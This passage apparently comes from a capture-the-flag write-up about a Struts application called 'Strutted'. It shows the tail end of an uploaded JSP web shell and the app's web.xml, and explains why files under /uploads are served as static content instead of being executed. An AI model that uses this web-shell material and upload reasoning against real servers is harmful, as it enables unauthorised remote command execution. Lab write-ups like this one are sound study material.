                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>

```

That’s because of the configuration in the `web.xml` file for the application:

```

<?xml version="1.0" encoding="UTF-8"?>
<web-app id="struts_blank" version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>Strutted</display-name>

    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>
            org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter
        </filter-class>
    </filter>

    <servlet>
        <servlet-name>staticServlet</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>readonly</param-name>
            <param-value>true</param-value>
        </init-param>
    </servlet>

    <servlet-mapping>
        <servlet-name>staticServlet</servlet-name>
        <url-pattern>/uploads/*</url-pattern>
    </servlet-mapping>

    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

```

The second to last block defines anything in `/uploads/*` as for the `staticServlet`, which handles static files.